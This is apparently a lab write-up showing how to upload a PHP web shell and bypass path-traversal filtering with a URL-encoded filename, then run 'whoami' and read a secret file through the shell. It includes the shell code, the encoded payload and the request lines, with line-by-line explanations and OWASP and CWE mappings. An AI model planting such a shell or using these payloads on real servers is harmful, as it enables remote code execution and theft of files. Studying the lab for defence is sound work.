# Lab: Web Shell Upload via Path Traversal

## Difficulty

🟢 Apprentice

---

## Tools Used

- Burp Suite Community Edition
- Firefox
- Kali Linux
- PHP

## Vulnerability

- File Upload
- Path Traversal
- Remote Code Execution (RCE)  

## Category

File Upload Vulnerabilities

---

## OWASP

A03:2021 – Injection

A01:2021 – Broken Access Control

A05:2021 – Security Misconfiguration

---

## CWE

CWE-434

CWE-22

CWE-78

CWE-94

### Step 1 - Upload the PHP Web Shell

First, create a simple PHP web shell:

```php
<?php
echo system($_GET['cmd']);
?>
```

Save the file as:

```text
shell.php
```

Log in using the provided credentials:

```text
Username: wiener
Password: peter
```

Navigate to **My Account** and upload `shell.php` as your avatar.

The application accepts the file upload successfully.

### Why?

The objective of this step is to verify whether the application performs proper validation on uploaded files.

Even though the file has a `.php` extension, the server allows it to be uploaded without blocking it, indicating weak file upload validation.

At this point, the web shell has been stored on the server, but it has not yet been executed.

https://github.com/user-attachments/assets/316b18a9-12d5-4745-83df-c8979d2f408b

### Step 2 - Attempt Directory Traversal During File Upload

After successfully uploading the PHP web shell, send the original upload request to **Burp Repeater**.

Locate the following header inside the multipart request:

```http
Content-Disposition: form-data; name="avatar"; filename="shell.php"
```

Modify the filename by adding a directory traversal sequence:

```http
filename="../shell.php"
```

Then click **Send**.

The server responds with:

```text
The file avatars/shell.php has been uploaded.
```

### Why?

The goal of this step is to determine whether the application is vulnerable to **directory traversal** during file upload.

By changing the filename to:

```text
../shell.php
```

we attempt to upload the file outside the **avatars** directory.

However, the response shows:

```text
avatars/shell.php
```

instead of:

```text
../shell.php
```

This indicates that the application detects and strips the plain directory traversal sequence before saving the file.

Although this initial bypass attempt fails, it reveals that the server performs filename sanitization rather than rejecting the upload completely.

This information suggests that a more advanced traversal payload (such as URL encoding) may bypass the validation.

https://github.com/user-attachments/assets/c3631db0-4164-47df-b98a-3de8b6d39653

### Step 3 - Bypass the Upload Restriction and Verify the Web Shell Location

The application attempted to prevent the uploaded PHP file from being stored outside the **avatars** directory by sanitizing standard directory traversal sequences.

The initial payload:

```http
filename="../shell.php"
```

was normalized by the application and stored as:

```
avatars/shell.php
```

To bypass this validation, URL encode the traversal sequence:

```http
filename="%2e%2e%2fshell.php"
```

(or `..%2fshell.php`)

Send the modified request using **Burp Repeater**.

The upload is now accepted while preserving the encoded traversal sequence.

---

After the upload completes, verify where the web shell has actually been stored.

First, try accessing the encoded path:

```
/files/avatars/%2e%2e%2fshell.php
```

The server responds with:

```
404 Not Found
```

This confirms that the browser is requesting the literal encoded path rather than resolving the directory traversal sequence.

Next, manually request:

```
/files/shell.php
```

The request succeeds because the application decoded the filename during the upload process and stored the PHP web shell in the parent directory.

### Why does this work?

The application validates the filename **before URL decoding**.

During the upload process:

```
%2e%2e%2f
```

is decoded into

```
../
```

allowing the uploaded file to escape the intended **avatars** directory.

However, when requesting the file through the browser, the encoded URL is treated as part of the request path instead of being interpreted as directory traversal.

As a result:

```
/files/avatars/%2e%2e%2fshell.php
```

returns **404 Not Found**, while

```
/files/shell.php 
```
This time, the request **works** and the PHP web shell is successfully executed by the server.

https://github.com/user-attachments/assets/828e5404-90f1-4480-8da3-0c1ad8e55c20

### Step 4 - Execute Commands Through the Uploaded Web Shell

After confirming that the web shell was successfully uploaded to the **/files** directory, execute operating system commands by passing them as URL parameters.

First, verify that the web shell is working by requesting:

```http
GET /files/shell.php?cmd=whoami
```

The response confirms that the PHP file is being executed by the server and that **Remote Code Execution (RCE)** has been achieved.

Once command execution is confirmed, retrieve Carlos's secret by requesting:

```http
GET /files/shell.php?cmd=cat+/home/carlos/secret
```

The server returns the contents of:

```
/home/carlos/secret
```

Copy the returned secret and submit it using the **Submit solution** button to complete the lab.

---

## Understanding the PHP Web Shell

The uploaded web shell contains the following PHP code:

```php
<?php echo system($_GET['cmd']); ?>
```

Let's break down what each part does.

### `<?php`

Marks the beginning of a PHP script.

Everything between `<?php` and `?>` is interpreted and executed by the PHP engine.

---

### `$_GET['cmd']`

Retrieves the value of the **cmd** parameter from the URL.

For example, visiting:

```
/files/shell.php?cmd=whoami
```

stores:

```php
$_GET['cmd'] = "whoami"
```

Likewise,

```
/files/shell.php?cmd=cat+/home/carlos/secret
```

stores:

```php
$_GET['cmd'] = "cat /home/carlos/secret"
```

The **?** character begins the **query string** in a URL.

The syntax is:

```
?parameter=value
```

For example:

```
?cmd=whoami
```

means:

| Part | Meaning |
|------|---------|
| `cmd` | Parameter name |
| `whoami` | Parameter value |

If multiple parameters exist, they are separated with **&**:

```
?cmd=whoami&user=carlos
```

---

### Why is there a `+`?

In URLs, the **+** character represents a space.

Therefore,

```
?cmd=cat+/home/carlos/secret
```

becomes:

```bash
cat /home/carlos/secret
```

when received by the server.

---

### `system()`

The PHP `system()` function executes operating system commands.

For example,

```php
system("whoami");
```

is equivalent to running:

```bash
whoami
```

directly on the Linux server.

This is what gives the attacker **Remote Code Execution (RCE)**.

---

### `echo`

The `echo` statement prints the output returned by `system()` back to the browser.

Without `echo`, the command would still execute, but its output would not be displayed.

---

### `?>`

Marks the end of the PHP script.

Although optional in many PHP-only files, it is commonly included in simple examples like this web shell.

---

## Command Breakdown

### Verify Code Execution

```
?cmd=whoami
```

The command executed is:

```bash
whoami
```

This command tells you which operating system user is executing the PHP process.

Penetration testers commonly use this command first because it safely verifies that command execution is working before attempting more impactful actions.

---

### Read Carlos's Secret

```
?cmd=cat+/home/carlos/secret
```

The command executed is:

```bash
cat /home/carlos/secret
```

Breaking it down:

- `cat` displays the contents of a file.
- `/home/carlos/secret` is the file containing the lab solution.

The web shell executes the command and returns the file contents directly in the browser.

---

## Execution Flow

```
Browser
      │
      ▼
/files/shell.php?cmd=whoami
      │
      ▼
$_GET['cmd']
      │
      ▼
system("whoami")
      │
      ▼
Linux executes the command
      │
      ▼
echo prints the result in the browser
```

---

## Why does this work?

The application allows user-uploaded PHP files to be executed by the web server.

Because the uploaded file contains:

```php
system($_GET['cmd']);
```

any value supplied through the **cmd** URL parameter is executed as an operating system command.

This allows an attacker to:

- Execute arbitrary Linux commands.
- Read sensitive files.
- Enumerate the operating system.
- Potentially gain complete control over the server.

This is why unrestricted file upload vulnerabilities are considered **critical**, especially when uploaded files are executed by the server.

---

## What I Learned

- Uploading a PHP web shell can lead directly to **Remote Code Execution (RCE)**.
- `?cmd=whoami` is commonly used to verify successful command execution.
- `?cmd=cat+/home/carlos/secret` demonstrates how attackers can read sensitive files from the server.
- The `system()` function executes operating system commands supplied by user input and should never be exposed in production applications.
- Even a seemingly simple file upload vulnerability can result in complete server compromise.

---

https://github.com/user-attachments/assets/cb4083b2-7b95-4a51-9e03-efa3ccb984d6

## Impact

Successful exploitation allows an attacker to:

- Execute arbitrary operating system commands.
- Read sensitive files.
- Upload additional malicious payloads.
- Potentially obtain full control of the web server.

## OWASP Mapping

**OWASP Top 10 2021**

- **A03:2021 – Injection**
- **A01:2021 – Broken Access Control**
- **A05:2021 – Security Misconfiguration**

---

## CWE Mapping

- **CWE-434** – Unrestricted Upload of File with Dangerous Type
- **CWE-78** – Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CWE-94** – Improper Control of Generation of Code ('Code Injection')
- **CWE-22** – Path Traversal

